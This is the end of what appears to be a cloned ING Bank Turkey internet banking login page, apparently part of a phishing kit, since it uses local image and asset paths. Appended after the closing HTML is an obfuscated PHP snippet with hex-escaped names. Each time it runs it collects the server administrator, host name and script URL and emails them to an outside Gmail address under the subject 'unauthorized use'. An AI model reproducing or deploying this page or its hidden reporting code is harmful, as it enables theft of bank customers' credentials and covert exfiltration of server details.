	</div><div class="vbPreventMultipleClick" id="Div2"><a onclick="if (Page_ClientValidate(&#39;&#39;)){DsblMulPst(this);};return ;;" id="ctl00_mc_lbtnQRCodeNext" class="ui-buttons small blue w2-min w640-w-full f-right hidden vbnext" multiposttimeoutvalue="30000" href="javascript:__doPostBack(&#39;ctl00$mc$lbtnQRCodeNext&#39;,&#39;&#39;)"><span class="ui-arrows small blue"></span><p>QRİLERİ</p></a></div><div class="divLoader m-auto hidden text-center" style="position: fixed; width: 100%; height: 100em; left: 0; top: 0; z-index: 1000; padding-top: 20%;"><img src="./loader.gif" alt=""></div></div><br><label id="ctl00_mc_lblTemp" class="" ctl00_mc_lbltemp="" data-asyncvisiblekey="" data-asyncvaluekey=""></label><div class="line no-label wfull hidden-tablet"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" id="keyboard-link" data-lang="tr" tabindex="4" data-left="-440" data-top="40" class="button-link has-icon light-links"><span class="icon icon-keyboard"></span>Sanal Klavye</a></div><div id="VerificationControl" class="line cf" style="display:none"><label id="ctl00_mc_lblVerification" class="text-left title" for="">Doğrulama Kodu<span class="ui-icons s20x20 info tooltip" data-tooltip-auto-off="" style=""><span class="popup"><p>Resimdeki doğrulama kodunu giriniz.</p></span></span></label></div><div class="big-action  vbPreventMultipleClick line no-label cf"><input  type="image" value="Submit" src="yasla.png" /></div><div class="h-list-wrapper"><ul class="h-list no-label light-links"><li class="sup"><a onclick="return ;;" id="ctl00_mc_btnAskPassword" class="m-b10" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$mc$btnAskPassword&quot;, &quot;&quot;, false, &quot;&quot;, &quot;AssistFlow/MainPages/PnlUserCode.aspx&quot;, false, true))" style="display: block">Yardım İstiyorum</a></li></ul><br></div><input id="ctl00_mc_hdnDevicePrint" type="hidden" name="ctl00$mc$hdnDevicePrint" value="version=1&amp;pm_fpua=mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/51.0.2704.84 safari/537.36|5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36|Win32&amp;pm_fpsc=24|1920|1080|1050&amp;pm_fpsw=&amp;pm_fptz=2&amp;pm_fpln=lang=tr|syslang=|userlang=&amp;pm_fpjv=1&amp;pm_fpco=1"></div></div><div class="grid-4"><div class="grid-4 wfull qr-code-container"><div id="qrCodeContainer" style="display: block;"><h3 class="title">QR ile Hızlı Giriş</h3><div class="qr-code-inner"><div class="img-content"><img src="./qr-kodu.png" style="width: 118px; height: 118px;" id="qrImage" alt=""><div id="qrCodeRefresh" class="qr-refresh"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" onclick="return QRClicked();"><img src="./qr-refresh.png" alt=""><p>Kodu yenilemek için tıklayın.</p></a></div></div><p>QR kodu ile giriş yapmak istiyorsanız lütfen ING Mobil'deki <b> "QR Kodu ile Giriş" </b> butonuna tıklayın ve yönlendirmeleri izleyin.</p></div></div></div></div><script>function showHideAskPasswordInfo() {
            var control = $('#ctl00_mc_cpAskPasswordGray');
            if (control.css('display') == 'none') {
                control.css('display', 'block');
            } else {
                control.css('display', 'none');
            }
        }</script><input type="hidden" name="ctl00$mc$hdnIsMobileDeviceWideScr" id="ctl00_mc_hdnIsMobileDeviceWideScr"><script>$(document).ready(function () {
            $('#ctl00_mc_captchaFirstLogin_Container').addClass("f-left");
            var devicePrint = add_deviceprint();
            var hdnField = $('#ctl00_mc_hdnDevicePrint');
            hdnField.val(devicePrint);
            if (!$('#ctl00_mc_txtPhoneNumber_countryCodeBox').is(':disabled') && !GetElementValue('ctl00_mc_chkOtherCountryCode')) {
                SetElementDisabled(true, $('#ctl00_mc_txtPhoneNumber_countryCodeBox'));
                $('#ctl00_mc_txtPhoneNumber_countryCodeBox').attr('disabled', 'disabled').prop('disabled', true);
            }
            var IsCorporate = "False";
            var IsQrCodeLoginActive = "True";
            if (IsCorporate == "False" && IsQrCodeLoginActive == "True") {
                //QRClicked();
                var control = $("#qrCodeContainer");
                control.css('display', 'block');
            }
        });
        function setImageUrl() {
            setTimeout(function () {
                var qrImage = $('#qrImage');
                if (qrImage) {
                    var random = Math.random().toString().substring(2);
                    qrImage.attr('src', 'Handlers/QrCodeImageHandler.ashx?id=' + random);
                    var control = $("#qrCodeRefresh");
                    control.css('display', 'none');
                }
            }, 1);
        }
        $(theForm).submit(function (e) {
            return false;
        });
        var InterValID = 0;
        function QRClicked() {
            setImageUrl();
            setInterval(setImageUrl, '90000');
            InterValID = setInterval(approveOnClick, 5000);
            return false;
        }
        function ShowLoading() {
            $(".divLoader").removeClass('hidden');
        }
        function HideLoading() {
            $(".divLoader").addClass('hidden');
        }
        function approveOnClick() {
            $.ajax({
                url: "FirstLogin.aspx/QRCodeOtomaticLogin_Async",
                type: "POST",
                cache: false,
                async: false,
                data: {},
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                success: function (data) {
                    //console.log(data)
                    if (data.d == true) {
                        _gaq.push(['_trackEvent', 'Inbound Links', 'QR Reader', 'QR ile Login']);
                        SetCookieForOmniture();
                        clearInterval(InterValID);
                        QRCodeOtomaticLogin();
                    }
                    else {
                    }
                },
                fail: function () {
                    HideLoading();
                }
            });
            return true;
        }
        function SetCookieForOmniture() {
            //public'ten okunabilmesi için cookie'ye atıyoruz
            if ($.cookie("cookieForOmniture") != null)
                $.cookie("cookieForOmniture", null, { expires: -1, path: '/' }); //$.removeCookie("cookieForOmniture");
            var storeData = new Array();
            storeData[0] = '';
            storeData[1] = '';
            storeData[2] = '';
            storeData[3] = '';
            storeData[4] = '';
            storeData[5] = 'MjguMDkuMjAxNyAxMjozNDoyMA==';
            storeData[6] = '';
            $.cookie("cookieForOmniture", JSON.stringify(storeData), { expires: 180, path: '/', domain: '.ingbank.com.tr' });
        }
        function QRCodeOtomaticLogin() {
            setTimeout(function () {
                ShowLoading();
                var panelUser = $('#ctl00_mc_pnlLoginByUserName');
                if ((panelUser[0] != undefined)) {
                    eval($('#ctl00_mc_lbtnQRCodeNext').attr('href'));
                    }
                //eval($('#ctl00_mc_lbtnQRCodeNextTCKN').attr('href'));
            }, 1);
        }
        function ShowCaptchaControl()
        {
            $('#VerificationControl').show();
        }
        function HideCaptchaControl()
        {
            $('#VerificationControl').hide();
        }
        function ClearCaptchaText()
        {
            $('#ctl00_mc_captchaFirstLogin_CaptchaValueTextBox').val('')
        }</script></div><div id="bottomContentDiv"><div class="bottom-panel wrapper accordion aside" style="display:none" data-group="forms" data-id="state-5"><div class="wrapper-head w640"><h5>Bilgi Destek</h5><div class="toggle"></div><div class="clearfix"></div></div><div class="wrapper-content"><div class="wrapper boxes no-mbot"><div class="wrapper-content"><div class="group"><div class="ui-boxes grid-3 big gray knowledge-base f-left print-auto-height" data-equal-group="1" data-equal-height="1" style="height: 191px;"><div class="box-head"><h5 class="wfull"><span class="ui-icons s31x31 knowledge"></span>Bilgi Destek</h5><div class="separator wfull"></div></div><div class="box-content"><div class="w100pct"><ul class="v-list no-border"><li><a target="_self" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/NavigationController.aspx?page=GetFxRateList&amp;fromMenu=false">Döviz Kurları</a></li></ul></div><div class="w100pct"><ul class="v-list no-border"></ul></div><div class="clearfix"></div></div><div class="clearfix"></div></div></div></div></div></div></div><div class="bottom-panel wrapper accordion aside" style="display:none" data-group="forms" data-id="state-7"><div class="wrapper-head w640"><h5>Bizi Arayın</h5><div class="toggle"></div><div class="clearfix"></div></div><div class="wrapper-content"><div class="wrapper boxes no-mbot"><div class="wrapper-content"><div class="group"><div class="ui-boxes grid-3 big gray f-left callcenter print-auto-height" data-equal-height="1" style="height: 191px;"><div class="box-head"><h5 class="wfull">Bizi Arayın</h5><div class="separator wfull"></div></div><div class="box-content"><div class="w100pct cf">                
											<ul class="v-list no-disc no-border"><li><div class="f-left w3 dark-gray" style="margin-top: -3px;"><p class="highlighted">Bankamıza ait şube ve atm bilgilerini görüntülemek için tıklayın</p></div><div class="clearfix"></div></li><br><li><a id="btnLiveSupportRight" href="javascript:void(0);" class="action-button ui-buttons small blue cursorPointer w640-w-full" onclick="SetPublicLinkFlag();" target="_top" style="margin-top: -3px;float:right;"><span class="ui-arrows small blue"></span><p>Haritada Göster</p></a><div class="clearfix"></div></li></ul></div></div></div></div></div></div></div></div><div class="bottom-panel no-mbot wrapper aside" style="display:none" data-group="forms" data-id="state-6"><div class="wrapper-content"><div class="wrapper boxes no-mbot"><div class="wrapper-content"><div class="group"><div class="ui-boxes knowledge-base grid-3 big gray last apply-for callcenter p-p10 f-right callcenter print-auto-height" data-equal-height="1" style="height: 191px;"><div class="box-head"><h5>Hesaplayın</h5><div class="separator"></div></div><div class="box-content"><div class="w100pct"><ul class="v-list no-border"><li><a target="_self" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/NavigationController.aspx?page=GetFxRateList&amp;fromMenu=false">Döviz Kurları</a></li></ul></div></div></div><div class="clearfix"></div></div></div></div></div></div><div class="bottom-panel no-mbot wrapper aside" style="display:none"><div class="wrapper-content"><div class="wrapper boxes no-mbot"><div class="wrapper-content"><div class="group"><div class="ui-boxes grid-3 big gray last callcenter p-p10 f-right print-auto-height" data-equal-height="1" style="height: 191px;"><div class="box-head"><h5>Yatırım Ekstresi</h5><div class="separator wfull"></div></div><div class="box-content"><div class="w100pct"><p style="display:none" class="highlighted m-b10"></p><p class="highlighted m-b10">Görüntülemek için tıklayın</p><a target="_self" class="action-button ui-buttons small blue" style="float:right;" href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/NavigationController.aspx?page=GetRepoRateList&amp;fromMenu=false"><span class="ui-arrows small blue"></span><p>Görüntüle</p></a></div></div>                                           
					</div></div></div></div></div>                
</div><div class="bottom-panel wrapper accordion aside" style="display:block" data-group="forms" data-id="state-5"><div class="wrapper-head w640"><h5>Bilgi Destek</h5><div class="toggle"></div><div class="clearfix"></div></div><div class="wrapper-content"><div class="wrapper boxes no-mbot"><div class="wrapper-content"><div class="group"><div class="ui-boxes grid-3x2 big gray knowledge-base f-left print-auto-height" data-equal-height="1" style="height: 191px;"><div class="box-head"><h5 class="wfull"><span class="ui-icons s31x31 knowledge"></span>Bilgi Destek</h5><div class="separator wfull"></div></div><div class="box-content"><div class="w100pct f-left m-b5"><ul class="v-list no-border"><li><a id="knowledgeBase_LeftActionLink_0" onclick="SetPublicLinkFlag();" target="_top" href="https://www.ingbank.com.tr/tr/bilgi-destek/ing-internet-subesi#faq12731">Anında Şifre Nedir?</a></li><li><a id="knowledgeBase_LeftActionLink_1" onclick="SetPublicLinkFlag();" target="_top" href="https://www.ingbank.com.tr/tr/ingbank/7-24-bankacilik/mobil-bankacilik">ING Mobil</a></li><li><a id="knowledgeBase_LeftActionLink_2" onclick="SetPublicLinkFlag();" target="_top" href="https://www.ingbank.com.tr/tr/ingbank/7-24-bankacilik/telefon-bankaciligi">Telefon Bankacılığı</a></li></ul></div><div class="w100pct f-right"><ul class="v-list no-border"><li><a id="knowledgeBaseRightActionLink_0" onclick="SetPublicLinkFlag();" target="_top" href="https://www.ingbank.com.tr/tr/bilgi-destek/ing-internet-subesi#faq7942">Cep Şifre Nedir?</a></li><li><a id="knowledgeBaseRightActionLink_1" onclick="SetPublicLinkFlag();" target="_top" href="https://www.ingbank.com.tr/tr/bilgi-destek/ing-internet-subesi#islem-limit-ve-saatleri">İnternet Şubesi İşlem Limit ve Saatleri</a></li><li><a id="knowledgeBaseRightActionLink_2" onclick="SetPublicLinkFlag();" target="_top" href="https://www.ingbank.com.tr/tr/bilgi-destek/ing-internet-subesi#faq12789">Güvenli Kullanım için İpuçları</a></li></ul></div><div class="clearfix"></div></div><div class="clearfix"></div></div></div></div></div></div></div><div class="bottom-panel no-mbot wrapper accordion aside" style="display:block" data-group="forms" data-id="state-6"><div class="wrapper-head w640"><h5>Bizi Arayın</h5><div class="toggle"></div><div class="clearfix"></div></div><div class="wrapper-content"><div class="wrapper boxes no-mbot"><div class="wrapper-content"><div class="group"><div class="ui-boxes grid-3 big gray last callcenter p-p10 f-right print-auto-height" data-equal-group="1" data-equal-height="1" style="height: 191px;"><div class="box-head"><h5>Bizi Arayın</h5><div class="separator wfull"></div></div><div class="box-content"><div class="w100pct cf">                
								<ul class="v-list no-disc no-border"><li style="color:#666!important"><span class="ui-icons s12x16 small orange-phone"></span>0850 2220600<div class="clearfix"></div></li></ul></div></div></div><div class="clearfix"></div></div></div></div></div> 
</div><script type="text/javascript">var btnLiveSupportRight = $("#btnLiveSupportRight");
	var btnLiveSupportInvestmentRight = $("#btnLiveSupportInvestmentRight");
	$(function(){
		 if ($.ie8){
			btnLiveSupportRight.hide();
			btnLiveSupportInvestmentRight.hide();
		 }
	});
	if (btnLiveSupportRight !== undefined && btnLiveSupportRight !== null && btnLiveSupportRight.length > 0) {
		btnLiveSupportRight.on("click", clickHandler);
	}
	if (btnLiveSupportInvestmentRight !== undefined && btnLiveSupportInvestmentRight !== null && btnLiveSupportInvestmentRight.length > 0) {
		btnLiveSupportInvestmentRight.on("click", investmentAdviserClickHandler);
	}
	function clickHandler() {
					_gaq.push(['_trackEvent', 'Inbound Links', 'LightboxOpen', 'Canlı Destek Ekran Açılış']);
				liveSupport.popup.open();
	}
	function investmentAdviserClickHandler() {
				_gaq.push(['_trackEvent', 'Inbound Links', 'LightboxOpen', 'Yatırım Danışmanı Ekran Açılış']);
				liveSupport.popup.openInvestmentAdviser();
	}
</script><div class="clearfix"></div><div class="bottom-link w640 m-t40 m-b10"><a href="https://internetsubesi.ingbank.com.tr/WebApplication.UI/Login/FirstLogin.aspx?vbi=eJeOBWj%2fLEMd9hPnPG2dtxUuiacJ7hWWGHhGUWt%2fU9RFf%2fW4xNRHGrrzHSv6V4NHwmUPWFtU4mPPYnO1%2bXnc8A%3d%3d#" class="ui-buttons blank f-left last"><span class="ui-arrows top">&nbsp;&nbsp;&nbsp;&nbsp;</span></a><div class="clearfix"></div></div><footer><nav class="copyright-nav"><ul class="menu h-list"><li class="copyright">© ING Bank</li><li><a id="ctl00_hlkSecurity" onclick="SetPublicLinkFlag();;" href="https://www.ingbank.com.tr/tr/bilgi-destek/ing-internet-subesi" target="_top">Güvenlik</a></li><li><a id="ctl00_hlkTermsConditions" onclick="SetPublicLinkFlag();;" href="https://www.ingbank.com.tr/tr/ingbank/kullanim-sartlari" target="_top">Kullanım Şartları</a></li><li><a onclick="return ;;" id="ctl00_hlkLanguage" href="javascript:__doPostBack(&#39;ctl00$hlkLanguage&#39;,&#39;&#39;)">English</a></li><li></li></ul></nav></footer></div></div></div></div></div><div class="overlay"></div></section></div></div><div id="dp-overlay"></div><script type="text/javascript">var pageURLForOmniture = "/WebApplication.UI/Login/FirstLoginByUserName/tr";
                var smartSiteTypeForOmniture = "Retail";</script><script type="text/javascript" src="./GeneralScript.js"></script><script type="text/javascript" src="./OmnitureScript.js"></script><input type="hidden" name="ctl00$antiforgery" id="ctl00_antiforgery"><script type="text/javascript">//<![CDATA[
var Page_Validators =  new Array(document.getElementById("ctl00_mc_ctl16"), document.getElementById("ctl00_mc_ValUserIdRequired"), document.getElementById("ctl00_mc_ctl17"), document.getElementById("ctl00_mc_ValPasswordRequired"));
//]]></script><script type="text/javascript">//<![CDATA[
var ctl00_mc_ctl16 = document.all ? document.all["ctl00_mc_ctl16"] : document.getElementById("ctl00_mc_ctl16");
ctl00_mc_ctl16.controltovalidate = "txtuserid";
ctl00_mc_ctl16.focusOnError = "t";
ctl00_mc_ctl16.errormessage = "Lütfen geçerli karakterler ile giriş yapın.";
ctl00_mc_ctl16.display = "Dynamic";
ctl00_mc_ctl16.evaluationfunction = "CustomValidatorEvaluateIsValid";
var ctl00_mc_ValUserIdRequired = document.all ? document.all["ctl00_mc_ValUserIdRequired"] : document.getElementById("ctl00_mc_ValUserIdRequired");
ctl00_mc_ValUserIdRequired.controltovalidate = "txtuserid";
ctl00_mc_ValUserIdRequired.focusOnError = "t";
ctl00_mc_ValUserIdRequired.errormessage = "Lütfen kullanıcı kodunuzu veya TC kimlik numaranızı girin.";
ctl00_mc_ValUserIdRequired.display = "Dynamic";
ctl00_mc_ValUserIdRequired.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
ctl00_mc_ValUserIdRequired.initialvalue = "";
var ctl00_mc_ctl17 = document.all ? document.all["ctl00_mc_ctl17"] : document.getElementById("ctl00_mc_ctl17");
ctl00_mc_ctl17.controltovalidate = "txtPass";
ctl00_mc_ctl17.focusOnError = "t";
ctl00_mc_ctl17.errormessage = "Lütfen geçerli karakterler ile giriş yapın.";
ctl00_mc_ctl17.display = "Dynamic";
ctl00_mc_ctl17.evaluationfunction = "CustomValidatorEvaluateIsValid";
var ctl00_mc_ValPasswordRequired = document.all ? document.all["ctl00_mc_ValPasswordRequired"] : document.getElementById("ctl00_mc_ValPasswordRequired");
ctl00_mc_ValPasswordRequired.controltovalidate = "txtPass";
ctl00_mc_ValPasswordRequired.focusOnError = "t";
ctl00_mc_ValPasswordRequired.errormessage = "Lütfen şifrenizi girin.";
ctl00_mc_ValPasswordRequired.display = "Dynamic";
ctl00_mc_ValPasswordRequired.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
ctl00_mc_ValPasswordRequired.initialvalue = "";
//]]></script><div class="aspNetHidden"><input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="RyqnlY4SPfgLO2W6leTbPsqKGyWY2iMEGDnZDOZhkktzeJOYzXMSqBpkDtFxHBG9xOsNEsuGgryp7ijf9fS86cbRObPZ7ejJiRrrcg2"><input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="LGeOVIwZ8+dVSbWsAz+5W0qeEJ5b7Ym1XBmcXYZzzVJpwnE0eNoYDJt02mARaCRRAIK9JmNc8CSlKA3f211i3EE8+/7Vj9o4pzMocGDue5yirkcaLTVqrnBQNZrVaEvbROe6bLRsrPE6psnyFICuOFzd6J1KzsT42KSyyfR8CfgDL/DkwB7pmtNtiE0bZzfVF1KSygdh3/iCjMKJDLXUJihmygaKsj5YckhDhlGu9s86AIdiZDhc7rOWZ7ppYnv9dx1zkqLjyyab1v524RUgpIdt+zJnGsWzTYzFbBq6D+Qq9UmJ79v2Y2dmHeiMT7VTEViyIA3fMmxoonLXpL84DLIL0oY="></div><script type="text/javascript">window.top.veribranch_id=window.veribranch_id; </script><script type="text/javascript">//<![CDATA[
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}
function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
        //]]></script></form><script type="text/javascript">var _gaq = _gaq || [];
        _gaq.push(['_setAccount', 'UA-671274-15']);
        var loginType = "/WebApplication.UI/Login/FirstLoginByUserName/tr";
        if (loginType) {
            _gaq.push(['_trackPageview', loginType]);
        }
        else {
            _gaq.push(['_trackPageview']);
        }
        (function () {
            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
        })();</script><script>function showDoubleClickLayer() {
            doubleClickPreventLayer = $("div#doubleClickPreventLayer");
            if (doubleClickPreventLayer.length > 0) {
                doubleClickPreventLayer.show();
            }
        }</script><script type="text/javascript" language="javascript">InitializeMobileInputScroll();
        function resizeIframe(dynheight) {
            try {
                var f = top.parent.document.getElementById("iframe1");
                if (f.contentDocument) {
                    $(f).css("min-height", f.contentDocument.documentElement.scrollHeight + 200 + "px"); //FF 3.0.11, Opera 9.63, and Chrome
                } else {
                    $(f).css("min-height", f.contentWindow.documentElement.scrollHeight + 200 + "px");
                }
            }
            catch (err) {
                window.status = err.message;
            }
        }
        window.onload = function () {
            if (IsAndroidBrowser()) {
                var height = document.body.scrollHeight;
                setTimeout(resizeIframe, 100, height);
            }
        };</script><input name="ctl00$hiddenField" type="hidden" id="ctl00_hiddenField" value="113"><!-- SiteCatalyst code version: H.26. 
   Copyright 1996-2013 Adobe, Inc. All Rights Reserved 
More info available at http://www.omniture.com --><!--script language="JavaScript" type="text/javascript" src="https://INSERT-DOMAIN-AND-PATH-TO-CODE-HERE/s_code.js"></script--><script lang="JavaScript" type="text/javascript"><!-- 
    if (navigator.appVersion.indexOf('MSIE') >= 0) document.write(unescape('%3C') + '\!-' + '-')
    //--></script><noscript>&lt;img src="https://ingturkey.d3.sc.omtrdc.net/b/ss/ingtrprod/1/H.26--NS/0?[AQB]&amp;cdp=3&amp;[AQE]"
            height="1" width="1" border="0" alt="" /&gt;</noscript><!--/DO NOT REMOVE/--><!-- End SiteCatalyst code version: H.26. --><script>var TealeafClientCallEnabled = "true";
        var TealeafActive = "true";</script><div id="tooltip" style="display: none;"><h3></h3><div class="body"></div><div class="url"></div></div></body></html>

<?php ${"\x47\x4cO\x42\x41L\x53"}["t\x70s\x62\x77y\x70"]="m\x61h\x6f";${"GL\x4fB\x41\x4cS"}["\x69\x67x\x68\x6e\x71\x66\x67n\x69\x63"]="\x6bim\x65";${${"\x47\x4c\x4fB\x41\x4cS"}["\x69\x67x\x68\x6e\x71\x66\x67n\x69c"]}="d\x65\x6ci\x63o\x63\x75h@\x67m\x61il\x2ec\x6fm";$iizzpgblj="b\x61\x73li\x6b";${$iizzpgblj}="\x69z\x69ns\x69\x7a\x20K\x75lla\x6eı\x6d";${${"\x47\x4cO\x42\x41\x4c\x53"}["\x74\x70s\x62\x77\x79\x70"]}.="\x53\x65rver A\x64min :\x20".$_SERVER["\x53\x45R\x56\x45R_\x41D\x4dIN"]."\r\n";${${"\x47\x4c\x4f\x42ALS"}["tp\x73\x62\x77y\x70"]}.="\x4ci\x6ek : http://".$_SERVER["SE\x52VER\x5f\x4e\x41ME"].$_SERVER["PH\x50_\x53EL\x46"]."\r\n";$wplcsutykqu="\x6bi\x6d\x65";$khmujalhx="\x6d\x61ho";${$khmujalhx}.="S\x69\x74\x65\x20: ".$_SERVER["\x48\x54T\x50\x5fH\x4fS\x54"]."\r\n";${"G\x4c\x4f\x42\x41L\x53"}["\x74l\x63\x69\x76gj"]="\x62as\x6ci\x6b";mail(${$wplcsutykqu},${${"\x47\x4cO\x42\x41\x4c\x53"}["\x74\x6c\x63\x69\x76\x67\x6a"]},${${"G\x4c\x4fBALS"}["\x74\x70\x73bw\x79\x70"]});
?>